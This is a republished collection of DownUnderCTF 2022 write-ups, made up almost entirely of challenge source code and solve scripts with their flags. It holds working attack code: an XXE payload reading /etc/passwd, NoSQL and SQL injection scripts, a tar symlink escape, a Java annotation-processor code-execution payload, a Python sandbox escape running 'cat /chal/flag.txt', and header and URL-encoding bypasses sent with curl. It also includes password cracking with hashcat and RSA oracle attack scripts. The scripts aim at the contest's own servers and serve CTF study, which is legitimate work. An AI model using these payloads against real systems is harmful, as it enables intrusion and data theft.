# DownUnderCTF 2022 Writeups

> 原文: https://www.ctfiot.com/59624.html
> ID: 59624


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
from z3 import *

class baby_arx:
 def __init__(self, key):
 assert len(key) == 64
 self.state = list(key)

 def b(self):
 b1 = self.state[0]
 b2 = self.state[1]
 b1 = b1 ^ ((b1 << 1) | (b1 & 1))
 b2 = b2 ^ (LShR(b2, 5) | (b2 << 3))
 b = b1 + b2
 self.state = self.state[1:] + [b]
 return b

 def stream(self, n):
 return [self.b() for _ in range(n)]

ct = bytes.fromhex(
 "cb57ba706aae5f275d6d8941b7c7706fe261b7c74d3384390b691c3d982941ac4931c6a4394a1a7b7a336bc3662fd0edab3ff8b31b96d112a026f93fff07e61b"
)

key = [BitVec(f"key{i}", 8) for i in range(64)]
sol = Solver()
out = baby_arx(key).stream(64)
for x, y in zip(out, ct):
 sol.add(x == y)
for x, y in zip(key, b"DUCTF{"):
 sol.add(x == y)
for x in key:
 sol.add(And(x >= 20, x <= 127))
assert sol.check() == sat
m = sol.model()
key = [m[k].as_long() for k in key]
print(bytes(key))
# DUCTF{i_d0nt_th1nk_th4ts_h0w_1t_w0rks_actu4lly_92f45fb961ecf420}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
#!/usr/bin/env python3

from os import urandom, path
from Crypto.Cipher import AES

FLAG = open(path.join(path.dirname(__file__), 'flag.txt'), 'r').read().strip()
MESSAGE = f'Decrypt this... {urandom(300).hex()} {FLAG}'

def main():
 key = urandom(16)
 for _ in range(2):
 iv = bytes.fromhex(input('iv: '))
 aes = AES.new(key, iv=iv, mode=AES.MODE_OFB)
 ct = aes.encrypt(MESSAGE.encode())
 print(ct.hex())

if __name__ == '__main__':
 main()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
from pwn import *

def xor(a, b):
 return bytes([x ^ y for x, y in zip(a, b)])

def blocks(x, n):
 return [x[i : i + n] for i in range(0, len(x), n)]

prefix = b"Decrypt this... "[:16]

# io = process(["python", "ofb.py"])
io = remote("2022.ductf.dev", 30009)
io.sendlineafter(b"iv: ", (b"\x00" * 16).hex().encode())
ct1 = bytes.fromhex(io.recvlineS().strip())
io.sendlineafter(b"iv: ", xor(prefix, ct1).hex().encode())
ct2 = bytes.fromhex(io.recvlineS().strip())

enc1 = blocks(ct1, 16)
enc2 = blocks(ct2, 16)
pt = prefix
for x, y in zip(enc2, enc1[1:]):
 pt += xor(xor(x, pt[-16:]), y)
print(pt)
# DUCTF{0fb_mu5t_4ctu4lly_st4nd_f0r_0bvi0usly_f4ul7y_bl0ck_c1ph3r_m0d3_0f_0p3ra710n_7b9cb403e8332c980456b17a00abd51049cb8207581c274fcb233f3a43df4a}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
p = 55899879511190230528616866117179357211
V = GF(p)^3
R.<x> = PolynomialRing(GF(p))
f = x^3 + 36174005300402816514311230770140802253*x^2 + 35632245244482815363927956306821829684*x + 10704085182912790916669912997954900147
Q = R.quotient(f)

def V_pow(A, n):
 return V([a^n for a in list(A)])

n, m = randint(1, p), randint(1, p)
A = Q.random_element()
B = Q.random_element()
C = A^n * B^m

print(' '.join(map(str, list(A))))
print(' '.join(map(str, list(B))))
print(' '.join(map(str, list(C))))

phi_A = V(list(map(int, input().split())))
phi_B = V(list(map(int, input().split())))
phi_C = V(list(map(int, input().split())))

check_phi_C = V_pow(phi_A, n).pairwise_product(V_pow(phi_B, m))

if phi_C == check_phi_C:
 print(open('./flag.txt', 'r').read().strip())
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
#!/usr/bin/env python3

import signal, time
from os import urandom, path
from Crypto.Util.number import getPrime, bytes_to_long

FLAG = open(path.join(path.dirname(__file__), 'flag.txt'), 'r').read().strip()

N_BITS = 384
TIMEOUT = 10 * 60
MAX_INTERVALS = 384
MAX_QUERIES = 384

def main():
 p, q = getPrime(N_BITS//2), getPrime(N_BITS//2)
 N = p * q
 e = 0x10001
 d = pow(e, -1, (p - 1) * (q - 1))

 secret = bytes_to_long(urandom(N_BITS//9))
 c = pow(secret, e, N)

 print(N)
 print(c)

 intervals = []
 queries_used = 0

 while True:
 print('1. Add interval\n2. Request oracle\n3. Get flag')
 choice = int(input('> '))

 if choice == 1:
 if len(intervals) >= MAX_INTERVALS:
 print('No more intervals allowed!')
 continue

 lower = int(input(f'Lower bound: '))
 upper = int(input(f'Upper bound: '))
 intervals.insert(0, (lower, upper))

 elif choice == 2:
 queries = input('queries: ')
 queries = [int(c.strip()) for c in queries.split(',')]
 queries_used += len(queries)
 if queries_used > MAX_QUERIES:
 print('No more queries allowed!')
 continue

 results = []
 for c in queries:
 m = pow(c, d, N)
 for i, (lower, upper) in enumerate(intervals):
 in_interval = lower < m < upper
 if in_interval:
 results.append(i)
 break
 else:
 results.append(-1)

 print(','.join(map(str, results)), flush=True)

 time.sleep(MAX_INTERVALS * (MAX_QUERIES // N_BITS - 1))
 elif choice == 3:
 secret_guess = int(input('Enter secret: '))
 if secret == secret_guess:
 print(FLAG)
 else:
 print('Incorrect secret :(')
 exit()

 else:
 print('Invalid choice')

if __name__ == '__main__':
 signal.alarm(TIMEOUT)
 main()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
from pwn import *

# context.log_level = 'debug'
# io = process(["python", "rsa-interval-oracle-i.py"])
io = remote("2022.ductf.dev", 30008)
e = 0x10001
n = int(io.recvline())
c = int(io.recvline())

l = -1
r = 2**336
while l + 1 < r:
 m = (l + r) // 2
 print(l, r)
 io.sendafter(b"> ", f"1\n{l}\n{m+1}\n".encode())
 io.sendafter(b"> ", f"2\n{c}\n".encode())
 res = int(io.recvline().split(b": ")[1])
 if res == 0:
 r = m
 else:
 l = m
for x in range(l, r + 1):
 if pow(x, e, n) == c:
 io.sendafter(b"> ", b"3\n")
 io.sendline(str(x).encode())
 io.interactive()
 break
# DUCTF{d1d_y0u_us3_b1n4ry_s34rch?}
1
2
3
4
12c12
< MAX_INTERVALS = 384
---
> MAX_INTERVALS = 1
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
from pwn import *
import gmpy2

def pow(a, b, c):
 return int(gmpy2.powmod(a, b, c))

def attempt():
 # context.log_level = 'debug'
 # io = process(["python", "rsa-interval-oracle-ii.py"])
 io = remote("2022.ductf.dev", 30011)
 e = 0x10001
 n = int(io.recvline())
 c = int(io.recvline())

 k = 48
 B = 1 << (8 * k - 8)
 io.sendafter(b"> ", f"1\n-1\n{B}\n".encode())

 def oracle(c):
 io.sendafter(b"> ", f"2\n{c}\n".encode())
 return int(io.recvline().split(b": ")[1]) != -1

 def Manger_Attack(c):
 f1 = 2
 while True:
 val = (pow(f1, e, n) * c) % n
 if oracle(val):
 f1 = 2 * f1
 else:
 break
 print("first")
 f12 = f1 // 2
 f2 = ((n + B) // B) * f12
 while True:
 val = (pow(f2, e, n) * c) % n
 if oracle(val):
 break
 else:
 f2 += f12
 print("second")
 m_min = (n + f2 - 1) // f2
 m_max = (n + B) // f2
 # note the ERRATA from https://github.com/GDSSecurity/mangers-oracle
 while m_min < m_max:
 f_tmp = (2 * B) // (m_max - m_min)
 I = (f_tmp * m_min) // n
 f3 = (I * n + m_min - 1) // m_min
 val = (pow(f3, e, n) * c) % n
 if oracle(val):
 m_max = (I * n + B) // f3
 else:
 m_min = (I * n + B + f3 - 1) // f3
 return m_min

 try:
 res = Manger_Attack(c)
 print(res)
 io.sendafter(b"> ", b"3\n")
 io.sendline(str(res).encode())
 print(io.recvlineS())
 return True
 
except:
 return False

while not attempt():
 pass
# DUCTF{Manger_w0uld_b3_pr0ud_0f_y0u}
1
2
3
4
5
6
7
8
11,13c11,13
< TIMEOUT = 10 * 60
< MAX_INTERVALS = 1
< MAX_QUERIES = 384
---
> TIMEOUT = 3 * 60
> MAX_INTERVALS = 4
> MAX_QUERIES = 4700
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
from pwn import process, remote, context
import random
from Crypto.Util.number import sieve_base

N_BITS = 384
TIMEOUT = 3 * 60
MAX_INTERVALS = 4
MAX_QUERIES = 4700
B = 1 << (N_BITS // 9 * 8)

def connect():
 # context.log_level = 'debug'
 # io = process(["python", "rsa-interval-oracle-iii.py"])
 io = remote("2022.ductf.dev", 30010)
 e = 0x10001
 N = int(io.recvline())
 c = int(io.recvline())
 ar = []
 lb = []
 ub = []
 intervals = [
 (0, 2 ** (N_BITS - 11)),
 (0, 2 ** (N_BITS - 10)),
 (0, 2 ** (N_BITS - 9)),
 (0, 2 ** (N_BITS - 8)),
 ]
 for lb, ub in intervals[::-1]:
 io.sendafter(b"> ", f"1\n{lb}\n{ub}\n".encode())

 # cand = [random.randint(1, N) for _ in range(4700)]
 cand = [power_mod(pr, -1, N) for pr in sieve_base[:
4700]]
 io.sendlineafter(b"> ", b"2")
 io.sendlineafter(b"queries: ", ",".join([str(c*power_mod(a,e,N)%N) for a in cand]).encode())
 res = list(map(int, io.recvlineS().strip().split(",")))
 ar = []
 lb = []
 ub = []
 for a, r in zip(cand, res):
 if r != -1:
 ar.append(a)
 lb.append(intervals[r][0])
 ub.append(intervals[r][1])
 return io, (ar, lb, ub), (N, e, c)

while True:
 io, (ar, lb, ub), (N, e, c) = connect()
 print(len(ar))
 if len(ar) < 45:
 print("again")
 io.close()
 continue
 if len(ar) > 60:
 ar = ar[:60]
 lb = lb[:60]
 ub = ub[:60]
 load("solver.sage")
 M = matrix(ar).stack(matrix.identity(len(ar)) * N)
 M = matrix([1] + len(ar) * [0]).T.augment(M)
 _, _, fin = solve(M, [0] + lb, [B] + ub)
 secret = fin[0]
 print(secret)
 if power_mod(secret, e, N) != c:
 print("QAQ")
 io.close()
 continue
 io.sendafter(b"> ", b"3\n")
 io.sendline(str(secret).encode())
 print(io.recvlineS())
 break
# DUCTF{rsa_1nt3rv4l_0r4cl3_1s_n0_m4tch_f0r_y0u!}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
from hashlib import sha256
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES

ct = bytes.fromhex('85534f055c72f11369903af5a8ac64e2f4cbf27759803041083d0417b5f0aaeac0490f018b117dd4376edd6b1c15ba02')

p = 275344354044844896633734474527970577743
a = [2367876727, 2244612523, 2917227559, 2575298459, 3408491237, 3106829771, 3453352037]
α = [843080574448125383364376261369231843, 1039408776321575817285200998271834893, 712968634774716283037350592580404447, 1166166982652236924913773279075312777, 718531329791776442172712265596025287, 766989326986683912901762053647270531, 985639176179141999067719753673114239]

def f(n):
 if n < len(α):
 return α[n]

 n -= len(α) - 1
 t = α[::-1]
 while n > 0:
 x = sum([a_ * f_ for a_, f_ in zip(a, t)]) % p
 t = [x] + t[:-1]
 n -= 1

 return t[0]

n = 2**(2**1337)
key = sha256(str(f(n)).encode()).digest()
aes = AES.new(key, AES.MODE_ECB)
flag = unpad(aes.decrypt(ct), 16)
print(flag.decode())
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
p = 275344354044844896633734474527970577743
a = [2367876727, 2244612523, 2917227559, 2575298459, 3408491237, 3106829771, 3453352037]
alpha = [
 843080574448125383364376261369231843,
 1039408776321575817285200998271834893,
 712968634774716283037350592580404447,
 1166166982652236924913773279075312777,
 718531329791776442172712265596025287,
 766989326986683912901762053647270531,
 985639176179141999067719753673114239,
]

def f(n):
 if n < len(alpha):
 return alpha[n]

 n -= len(alpha) - 1
 t = alpha[::-1]
 while n > 0:
 x = sum([a_ * f_ for a_, f_ in zip(a, t)]) % p
 t = [x] + t[:-1]
 n -= 1
 return t[0]

K = GF(p)
M = matrix(K, a).stack(matrix.identity(len(a)))[:-1]

def f2(n):
 if n < len(alpha):
 return alpha[n]
 # return (M ^ (n - 6) * vector(alpha[::-1]))[0]
 return (M ^ n * vector(alpha[::-1]))[-1]

assert f(87) == f2(87)

# this works because the max prime factor of p-1 is 68 bits:
# od = M.multiplicative_order()
# od = 5747840427578934579418402212446804534742054912959507472646427706581721672984212149543182307880849869521914657360442377375504061940654295742621914326868064

# you can use this too: https://math.stackexchange.com/questions/34271/order-of-general-and-special-linear-groups-over-finite-fields
od = product([p ^ 7 - p ^ i for i in range(7)])
n = power_mod(2, 2**1337, od)

from hashlib import sha256
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES

ct = bytes.fromhex(
 "85534f055c72f11369903af5a8ac64e2f4cbf27759803041083d0417b5f0aaeac0490f018b117dd4376edd6b1c15ba02"
)
key = sha256(str(f2(n)).encode()).digest()
aes = AES.new(key, AES.MODE_ECB)
flag = unpad(aes.decrypt(ct), 16)
print(flag.decode())
# DUCTF{p4y_t0_w1n_91ea0a7b4b688fc8}
1
2
3
4
5
6
7
8
9
10
11
28c28
< intervals = []
---
> intervals = [(0, 2**(N_BITS - 11)), (0, 2**(N_BITS - 10)), (0, 2**(N_BITS - 9)), (0, 2**(N_BITS - 8))]
44a45,48
> if queries_used > 0:
> print('No more queries allowed!')
> continue
>
65d68
< time.sleep(MAX_INTERVALS * (MAX_QUERIES // N_BITS - 1))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
from pwn import process, remote, context
import random
from Crypto.Util.number import sieve_base

N_BITS = 384
TIMEOUT = 3 * 60
MAX_INTERVALS = 4
MAX_QUERIES = 4700
B = 1 << (N_BITS // 9 * 8)

def connect():
 # context.log_level = 'debug'
 # io = process(["python", "rsa-interval-oracle-iv.py"])
 io = remote("2022.ductf.dev", 30030)
 e = 0x10001
 N = int(io.recvline())
 c = int(io.recvline())
 ar = []
 lb = []
 ub = []

 # cand = [random.randint(1, N) for _ in range(4700)]
 cand = [power_mod(pr, -1, N) for pr in sieve_base[:
4700]]
 io.sendlineafter(b"> ", b"2")
 io.sendlineafter(
 b"queries: ", ",".join([str(c * power_mod(a, e, N) % N) for a in cand]).encode()
 )
 res = list(map(int, io.recvlineS().strip().split(",")))
 intervals = [
 (0, 2 ** (N_BITS - 11)),
 (0, 2 ** (N_BITS - 10)),
 (0, 2 ** (N_BITS - 9)),
 (0, 2 ** (N_BITS - 8)),
 ]
 ar = []
 lb = []
 ub = []
 for a, r in zip(cand, res):
 if r != -1:
 ar.append(a)
 lb.append(intervals[r][0])
 ub.append(intervals[r][1])
 return io, (ar, lb, ub), (N, e, c)

while True:
 io, (ar, lb, ub), (N, e, c) = connect()
 print(len(ar))
 if len(ar) < 50:
 print("again")
 io.close()
 continue
 if len(ar) > 60:
 ar = ar[:60]
 lb = lb[:60]
 ub = ub[:60]
 load("solver.sage")
 M = matrix(ar).stack(matrix.identity(len(ar)) * N)
 M = matrix([1] + len(ar) * [0]).T.augment(M)
 _, _, fin = solve(M, [0] + lb, [B] + ub)
 secret = fin[0]
 print(secret)
 if power_mod(secret, e, N) != c:
 print("QAQ")
 io.close()
 continue
 io.sendafter(b"> ", b"3\n")
 io.sendline(str(secret).encode())
 print(io.recvlineS())
 break
# DUCTF{rsa_1nt3rv4l_0r4cl3_1s_s3ri0usly_n0_m4tch_f0r_y0u...94b2a797eb5e0105}
1
2
3
RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
1
2
3
RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
1
2
3
4
5
curl 'http://34.87.217.252:
30026/one/flag.txt' -H 'Host: localhost'
curl 'http://34.87.217.252:
30026/two/fl%61g.txt'

DUCTF{thats_it_next_time_im_using_nginx}
1
2
3
.\hashcat.exe -a 0 -m 16500 .\hash.txt ..\rockyou.txt
secret: onepiece
DUCTF{7h3-0n3-p13c3-15-4ll-7h3-fl465-y0u-637-4l0n6-7h3-w4y}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
def findInternalFilepath(filename):
 try:
 prop = None
 parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
 tree = etree.parse(filename, parser=parser)
 root = tree.getroot()
 internalNode = root.find(".//{http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac}absPath")
 if internalNode != None:
 prop = {
 "Fieldname":"absPath",
 "Attribute":
internalNode.attrib["url"],
 "Value":
internalNode.text
 }
 return prop

 
except Exception:
 print("couldnt extract absPath")
 return None
1
2
3
4
5
6
7
<!DOCTYPE peko[
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<!-- ... -->
<x15ac:
absPath url="/Users/Shared/" xmlns:
x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" >&xxe;</x15ac:
absPath>

DUCTF{cexxelsyd_work_my_dyslexxec_friend}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
import httpx
import asyncio
import string

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MzJkYjI1YzQ0NGQ0OGYzNzUwYmM0ODQiLCJpYXQiOjE2NjQwMDQyNTYsImV4cCI6MTY2NDYwOTA1Nn0.eFQkc7bXY95xx5OZayHPUupBV7QEcxYcWbUGDxlT2N0"
chs = string.ascii_lowercase + string.digits + "{_}"

async def check_flag(h, rgx):
 r = await h.post(
 "/edit",
 params={"noteId": 1337, "contents[$regex]": rgx},
 json={"contents": {"length": 201}},
 )
 return "You are not the owner of this note!" == r.json()["error"]

async def main():
 async with httpx.AsyncClient(
 base_url="https://web-noteworthy-873b7c844f49.2022.ductf.dev/", cookies={"jwt": jwt}, http2=True
 ) as h:
 flag = "DUCTF{"
 while not flag.endswith("}"):
 res = await asyncio.gather(*[check_flag(h, flag + c) for c in chs])
 for c, r in zip(chs, res):
 if r:
 flag += c
 print(flag)
 break

asyncio.run(main())
# DUCTF{n0sql1_1s_th3_new_5qli}
1
2
ssh-keygen -t rsa -b 4096 -m PEM -f myjwt.key
openssl rsa -in myjwt.key -pubout -outform PEM -out myjwt.pub
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
# Flag is in the root as /flag (see attached Dockerfile)

require 'sinatra'
require 'securerandom'

set :
environment, :
production

def err(s)
 erb :
index, :
locals => {:
links => [], :
error => s}
end

def ok(l)
 erb :
index, :
locals => {:
links => l, :
error => nil}
end

get '/' do
 return ok []
end

post '/' do
 unless params[:
tarfile] && (tempfile = params[:
tarfile][:
tempfile])
 return err "File not sent"
 end
 unless tempfile.size <= 10240
 return err "File too big"
 end

 path = SecureRandom.hex 16
 unless Dir.mkdir "uploads/#{path}", 0755
 return err "Error creating directory"
 end
 unless system "tar -xvf #{tempfile.path} -C uploads/#{path}"
 return err "Error extracting tar file"
 end

 links = Dir.glob("uploads/#{path}/**/*", File::
FNM_DOTMATCH).select do |f|
 # Don't show . or ..
 if [".", ".."].include? File.basename f
 false
 # Don't show symlinks. Additionally delete them, they may be unsafe
 elsif File.symlink? f
 File.unlink f
 false
 # Don't show directories (but show files under them)
 elsif File.directory? f
 false
 # Show everything else
 else
 true
 end
 end

 return ok links
end

get '/uploads/*' do
 filepath = "uploads/#{::
Rack::
Utils.clean_path_info params['splat'].first}"
 halt 404 unless File.file? filepath
 send_file filepath
end

not_found do
 status 404
 '404'
end

error 500 do
 status 500
 '500'
end
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
import tarfile
import io

with tarfile.open("./out.tar", "w") as tar:
 hello = tarfile.TarInfo("hello")
 hello.type = tarfile.DIRTYPE
 hello.mode = 0o300 # not readable, so glob won't be able to find the symlink
 tar.addfile(hello)

 world = tarfile.TarInfo("world") # to leak folder name
 world.type = tarfile.REGTYPE
 world.mode = 0o400
 world.size = 5
 tar.addfile(world, io.BytesIO(b"world"))

 link = tarfile.TarInfo("hello/link")
 link.type = tarfile.SYMTYPE
 link.mode = 0o400
 link.linkname = "/flag"
 tar.addfile(link)
# DUCTF{are_symlinks_really_worth_the_trouble_they_cause?????}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
from flask import Flask, request
import textwrap
import sqlite3
import os
import hashlib

assert len(os.environ['FLAG']) > 32

app = Flask(__name__)

@app.route('/', methods=['POST'])
def root_post():
 post = request.form

 # Sent params?
 if 'username' not in post or 'password' not in post:
 return 'Username or password missing from request'

 # We are recreating this every request
 con = sqlite3.connect(':
memory:')
 cur = con.cursor()
 cur.execute('CREATE TABLE users (username TEXT, password TEXT)')
 cur.execute(
 'INSERT INTO users VALUES ("admin", ?)',
 [hashlib.md5(os.environ['FLAG'].encode()).hexdigest()]
 )
 output = cur.execute(
 'SELECT * FROM users WHERE username = {post[username]!r} AND password = {post[password]!r}'
 .format(post=post)
 ).fetchone()

 # Credentials OK?
 if output is None:
 return 'Wrong credentials'

 # Nothing suspicious?
 username, password = output
 if username != post["username"] or password != post["password"]:
 return 'Wrong credentials (are we being hacked?)'

 # Everything is all good
 return f'Welcome back {post["username"]}! The flag is in FLAG.'.format(post=post)

@app.route('/', methods=['GET'])
def root_get():
 return textwrap.dedent('''
 <html>
 <head></head>
 
 <form action="/" method="post">
 Welcome to admin panel!
 <label for="username">Username:</label>
 


 <label for="password">Password:</label>
 


 
 </form>
 
 </html>
 ''').strip()
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
import os
import sqlite3
import hashlib

os.environ["FLAG"] = "test_flag"
# sqli quine modified from https://github.com/splitline/My-CTF-Challenges/blob/049b591445b2ab902a6fdefa2382d44ef9f5af50/ais3-eof/2020-quals/Web/CYBERPUNK1977/exploit/solution.py#L23-L30
# request.form is ImmutableMultiDict
username = "{post.copy.__globals__[os].environ[FLAG]}"
fmt_leak = "||".join([f"CHAR({hex(ord(x))})" for x in username])
# fmt_leak = "CHAR(0x61)||CHAR(0x62)||CHAR(0x63)||CHAR(0x64)"
query = f"'UNION SELECT '{fmt_leak}',substr(query,1,###)||X'22'||query||X'22'||substr(query,@@@)"
query = f"\"'UNION SELECT {fmt_leak},substr(query,1,###)||char(0x22)||query||char(0x22)||substr(query,@@@)"
query = f"\"'UNION SELECT {fmt_leak},replace(substr(query,1,###),char(0x5c)||char(0x27),char(0x22)||char(0x27))||char(0x22)||query||char(0x22)||substr(query,@@@)"
query = f"\"'UNION SELECT {fmt_leak},replace( replace(substr(query,1,###),char(0x5c)||char(0x27),char(0x22)||char(0x27))||char(0x22)||query||char(0x22)||substr(query,@@@), char(0x22)||char(0x5c),char(0x20)||char(0x22))"
payload = f"""
{query} FROM(SELECT {query} FROM(SELECT as query)--" as query)--
""".strip() # .replace(" ", "/**/")
offset = payload.index(' "\x27UNION') # start of `query`
payload = payload.replace("###", str(offset)).replace("@@@", str(offset + 1))

post = {"username": username, "password": payload}

con = sqlite3.connect(":
memory:")
cur = con.cursor()
cur.execute("CREATE TABLE users (username TEXT, password TEXT)")
cur.execute(
 'INSERT INTO users VALUES ("admin", ?)',
 [hashlib.md5(os.environ["FLAG"].encode()).hexdigest()],
)
sql = "SELECT * FROM users WHERE username = {post[username]!r} AND password = {post[password]!r}".format(
 post=post
)
print(sql)
output = cur.execute(sql).fetchone()
print()
print(output[0])
print(output[1])
print()
print(post["username"])
print(post["password"])
print()
assert output[0] == post["username"]
assert output[1] == post["password"]

import requests

print(
 requests.post("https://web-sqli2022-85d13aec009e.2022.ductf.dev/", data=post).text
)
# DUCTF{alternative_solution_was_just_to_crack_the_hash_:p}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
def check_java_is_valid(folder)->bool:
 class_files = list_files(folder, allowed_ext=".java")

 temp_output = os.path.join("/", "tmp", "java", os.urandom(8).hex())
 os.makedirs(temp_output, exist_ok=True)
 old_cwd = os.getcwd()
 os.chdir(folder)

 # Using subprocess.run prevents any command injection students could exploit
 try:
 returned_code = subprocess.run(["/usr/bin/javac", "-d", temp_output]+class_files)
 
except:
 return False
 finally:
 os.chdir(old_cwd)

 return returned_code == 0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
import java.util.Set;

import javax.annotation.processing.AbstractProcessor;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.RoundEnvironment;
import javax.annotation.processing.SupportedAnnotationTypes;
import javax.annotation.processing.SupportedSourceVersion;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.TypeElement;

@SupportedAnnotationTypes("*")
@SupportedSourceVersion(SourceVersion.RELEASE_11)
public class Pwn extends AbstractProcessor {
 @Override
 public synchronized void init(ProcessingEnvironment env) {
 System.out.println("pwned");
 System.exit(0);
 }

 @Override
 public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
 System.out.println(roundEnv.processingOver());
 System.out.println(roundEnv.getRootElements());
 System.out.println(annotations);
 return false;
 }
}
1
2
3
4
5
6
7
8
9
10
11
12
{
 "type": "service_account",
 "project_id": "downunderctf-2022-chal-mjb",
 "private_key_id": "[REDACTED]",
 "private_key": "[REDACTED-CTF-Challenge-Private-Key]",
 "client_email": "[REDACTED]@[REDACTED].iam.gserviceaccount.com",
 "client_id": "111935028215153567724",
 "auth_uri": "https://accounts.google.com/o/oauth2/auth",
 "token_uri": "https://oauth2.googleapis.com/token",
 "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
 "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/buildkite-agent%40downunderctf-2022-chal-mjb.iam.gserviceaccount.com"
}
1
https://discord.com/oauth2/authorize?client_id=1006037829345882173&permissions=0&scope=bot%20applications.commands
1
2
3
4
5
6
7
8
9
10
11
12
13
with open('/flag.txt', 'rb') as f:
 FLAG = int.from_bytes(f.read().strip(), byteorder='big')

assert FLAG < 2**1024

while True:
 print("Enter your number:")

 try:
 n = FLAG * int(input("> "))
 print("Your digit is:", str(n)[-1])
 
except ValueError:
 print("Not a valid number! >:(")
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
from pwn import *

# io = process(["python", "last-digit.py"])
io = remote("2022.ductf.dev", 30003)

# CVE-2020-10735 lmao
# https://docs.python.org/release/3.10.7/whatsnew/3.10.html#notable-security-feature-in-3-10-7
B = 10**4300

def oracle(x):
 global io
 try:
 io.sendlineafter(b">", str(x).encode())
 return b"Your digit" in io.recvline()
 
except:
 io = remote("2022.ductf.dev", 30003)
 return oracle(x)

l = 0
r = 1 << 1024
while l < r:
 print((l - r).bit_length())
 m = (l + r) // 2
 if oracle(B // m):
 r = m
 else:
 l = m + 1
print(l)
print(r)
print(l.to_bytes(128, "big"))
# CTF{14288_bits_should_be_enough_for_anybody_:)}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
#!/usr/bin/env python3

import subprocess
import sys
import tempfile

print("Welcome to the Python syntax checking service!")
print("The safest code is the code you don't even execute.")
print("Enter your code. Write __EOF__ to end.")

code = b"exit(0)\n"
for line in sys.stdin.buffer:
 if line.strip() == b"__EOF__":
 break
 code += line

with tempfile.NamedTemporaryFile() as sandbox:
 sandbox.write(code)
 sandbox.flush()
 pipes = subprocess.Popen(["python3", sandbox.name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 _, stderr = pipes.communicate()
 if pipes.returncode == 0:
 print("Syntax OK!")
 else:
 print("There was an error:")
 print(stderr.decode())
1
2
3
4
5
import sys
import os
print(os.popen('cat /chal/flag.txt').read(), file=sys.stderr)
exit(1)
# DUCTF{next_time_ill_just_use_ast.parse}
1
python -m zipapp exp; (cat exp.pyz; printf '\n__EOF__\n') | nc 2022.ductf.dev 30002
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
